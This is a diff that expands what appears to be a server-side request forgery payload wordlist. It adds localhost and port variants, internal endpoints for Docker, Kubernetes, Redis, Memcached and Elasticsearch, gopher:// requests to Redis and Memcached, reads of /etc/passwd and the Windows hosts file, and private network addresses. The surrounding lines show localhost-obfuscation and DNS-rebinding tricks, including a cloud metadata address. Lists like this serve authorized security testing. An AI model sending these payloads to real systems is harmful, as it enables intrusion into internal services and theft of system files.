@@ -1,8 +1,28 @@
 # Localhost
+http://127.0.0.1:8000
+http://127.0.0.1:8080
+http://127.0.0.1:8888
+http://localhost:8000
+http://localhost:8080
+http://localhost:8888
+http://127.0.0.1:22
+http://127.0.0.1:23
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:3306
+http://localhost:22
+http://localhost:23
+http://localhost:80
+http://localhost:443
+http://localhost:3306
 http://127.0.0.1:80
 http://127.0.0.1:443
 http://127.0.0.1:22
 http://127.1:80
+http://127.0.0.1/webservice
+http://localhost/webservice
+http://127.0.0.1/api
+http://localhost/api
 http://127.000000000000000.1
 http://0
 http:@0/ --> http://localhost/
@@ -55,3 +75,51 @@ http://customer1.app.localhost.my.company.127.0.0.1.nip.io
 http://bugbounty.dod.network = 127.0.0.2 (localhost)
 1ynrnhl.xip.io == 169.254.169.254
 spoofed.burpcollaborator.net = 127.0.0.1
+#XXE VIA SSRF
+http://127.0.0.1:8080?xml=<foo><bar>http://example.com</bar></foo>
+http://localhost:8080?xml=<foo><bar>http://example.com</bar></foo>
+#SMB Shares
+smb://127.0.0.1/share
+smb://localhost/share
+#RDP
+http://127.0.0.1:3389
+http://localhost:3389
+#Elastic Search
+http://127.0.0.1:9200
+http://localhost:9200
+#Docker Search
+#http://127.0.0.1:2375/containers/json
+http://localhost:2375/containers/json
+#Jenkins
+http://127.0.0.1:8080
+http://localhost:8080
+#Kubernetes API
+http://127.0.0.1:8001/api
+http://localhost:8001/api
+#gopher
+gopher://127.0.0.1:6379/_PING
+gopher://127.0.0.1:11211/_STATS
+#MySQL
+http://127.0.0.1:3306
+http://localhost:3306
+#mongodb
+http://127.0.0.1:27017
+http://localhost:27017
+#memory cache
+http://127.0.0.1:11211
+http://localhost:11211
+#Redis
+http://127.0.0.1:6379
+http://localhost:6379
+#ftp local
+ftp://ftp.example.com/file.txt
+#LFI
+http://127.0.0.1/etc/passwd
+http://127.0.0.1/C:/Windows/System32/drivers/etc/hosts
+file:///etc/passwd
+file:///C:/Windows/System32/drivers/etc/hosts
+#internal network
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+
